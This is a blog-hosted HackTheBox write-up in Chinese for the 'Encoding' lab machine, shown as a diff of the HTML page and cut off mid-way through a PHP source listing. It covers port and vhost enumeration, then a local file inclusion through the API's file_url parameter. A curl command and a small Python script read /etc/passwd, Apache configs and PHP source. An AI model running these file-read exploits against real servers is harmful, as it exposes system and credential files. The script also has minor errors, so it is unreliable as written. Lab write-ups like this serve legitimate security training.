@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="日常记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox_Encoding">
+<meta property="og:url" content="https://yoloyolo.top/2023/03/21/HackTheBox-Encoding/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="日常记录">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-20T16:58:11.000Z">
+<meta property="article:modified_time" content="2023-03-20T17:15:00.250Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2023/03/21/HackTheBox-Encoding/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox_Encoding | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/03/21/HackTheBox-Encoding/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox_Encoding
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-21 00:58:11 / Modified: 01:15:00" itemprop="dateCreated datePublished" datetime="2023-03-21T00:58:11+08:00">2023-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>日常记录</p>
+<a id="more"></a>
+<h1 id="hackthebox_encoding"><a class="markdownIt-Anchor" href="#hackthebox_encoding"></a> HackTheBox_Encoding</h1>
+<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
+<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.198</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.198</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3>
+<p>在站点中获得域名信息<code>haxtables.htb</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\thaxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3>
+<p>枚举VHOST</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://haxtables.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.haxtables.htb&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                             </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000000051:   200        0 L      0 W        0 Ch        &quot;api&quot;                                               </span><br><span class="line">000000177:   403        9 L      28 W       284 Ch      &quot;image&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\tapi.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\timage.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
+<p>页面给出的API调用方法如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;str2hex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://example.com/data.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+<p>参数<code>file_url</code>可能存在LFI漏洞</p>
+<p>利用API进行LFI</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://api.haxtables.htb/v3/tools/string/index.php --json <span class="string">&#x27;&#123;&quot;action&quot;:&quot;b64encode&quot;,&quot;file_url&quot;:&quot;file:///etc/passwd&quot;&#125;&#x27;</span> | jq -r .data | base64 -d</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+<p>编写如下<code>lfi.py</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;file://%s&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = req.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">data = json.loads(res.text)</span><br><span class="line">print(b64decode(data[<span class="string">&quot;data&quot;</span>]).decode())</span><br></pre></td></tr></table></figure>
+<p>读取apache2站点配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName api.haxtables.htb</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;api</span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName image.haxtables.htb</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        </span><br><span class="line">    DocumentRoot &#x2F;var&#x2F;www&#x2F;image</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">    #SecRuleEngine On</span><br><span class="line"></span><br><span class="line">    &lt;LocationMatch &#x2F;&gt;</span><br><span class="line">        SecAction initcol:ip&#x3D;%&#123;REMOTE_ADDR&#125;,pass,nolog,id:&#39;200001&#39;</span><br><span class="line">        SecAction &quot;phase:5,deprecatevar:ip.somepathcounter&#x3D;1&#x2F;1,pass,nolog,id:&#39;200002&#39;&quot;</span><br><span class="line">        SecRule IP:SOMEPATHCOUNTER &quot;@gt 5&quot; &quot;phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:&#39;200003&#39;&quot;</span><br><span class="line">        SecAction &quot;phase:2,pass,setvar:ip.somepathcounter&#x3D;+1,nolog,id:&#39;200004&#39;&quot;</span><br><span class="line">        Header always set Retry-After &quot;10&quot; env&#x3D;RATELIMITED</span><br><span class="line">    &lt;&#x2F;LocationMatch&gt;</span><br><span class="line"></span><br><span class="line">    ErrorDocument 429 &quot;Rate Limit Exceeded&quot;</span><br><span class="line"></span><br><span class="line">        &lt;Directory &#x2F;var&#x2F;www&#x2F;image&gt;</span><br><span class="line">                Deny from all</span><br><span class="line">                Allow from 127.0.0.1</span><br><span class="line">                Options Indexes FollowSymLinks</span><br><span class="line">                AllowOverride All</span><br><span class="line">                Require all granted</span><br><span class="line">        &lt;&#x2F;DIrectory&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br></pre></td></tr></table></figure>
+<p>站点<code>image.haxtables.htb</code>仅允许本地访问</p>
+<p>读取<code>image.haxtables.htb/index.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lfi.py /var/www/image/index.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/coming_soon.html&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>读取<code>image.haxtables.htb/utils.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/image/utils.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span 